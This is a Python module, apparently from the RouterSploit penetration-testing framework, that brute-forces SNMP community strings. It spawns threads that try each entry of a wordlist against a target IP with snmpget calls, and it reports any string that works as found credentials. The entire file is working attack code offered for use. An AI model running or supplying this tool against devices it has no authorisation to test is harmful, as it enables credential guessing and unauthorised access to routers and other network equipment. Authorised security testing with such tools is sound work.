import threading
import itertools
import netsnmp
import socket

from routersploit.utils import print_status, print_success, print_error, print_table, LockedIterator
from routersploit import exploits
from routersploit import wordlists


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against SNMP service.
    If valid community string is found, it is displayed to the user.
    """
    __info__ = {
        'name': 'SNMP Bruteforce',
        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
    }

    target = exploits.Option('', 'Target IP address')
    port = exploits.Option(161, 'Target port')
    threads = exploits.Option(8, 'Number of threads')
    snmp = exploits.Option(wordlists.snmp, 'Community string or file with community strings (file://)')

    strings = []

    def run(self):
        self.strings= []
        print_status("Running module...")

        # todo: check if service is up

        if self.snmp.startswith('file://'):
            snmp = open(self.snmp[7:], 'r')
        else:
            snmp = [self.snmp]

        collection = LockedIterator(snmp)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.strings):
            print_success("Credentials found!")
            headers = tuple(["Community Strings"])
            print_table(headers, *self.strings)
        else:
            print_error("Valid community strings not found")
            
    def target_function(self, running, data):
        name = threading.current_thread().name
        address = "{}:{}".format(self.target, self.port)

        print_status(name, 'thread is starting...')

        while running.is_set():
            try:
                string = data.next().strip()

                bindvariable = netsnmp.Varbind(".1.3.6.1.2.1.1.1.0")
                res = netsnmp.snmpget(bindvariable, Version = 1, DestHost = address, Community=string)

                if res[0] != None:
                    running.clear()
                    print_success("{}: Valid community string found!".format(name), string)
                    self.strings.append(tuple([string]))
                else:
		    pass
                    # print_error("{}: Invalid community string.".format(name), string)

            except StopIteration:
                break

        print_status(name, 'thread is terminated.')
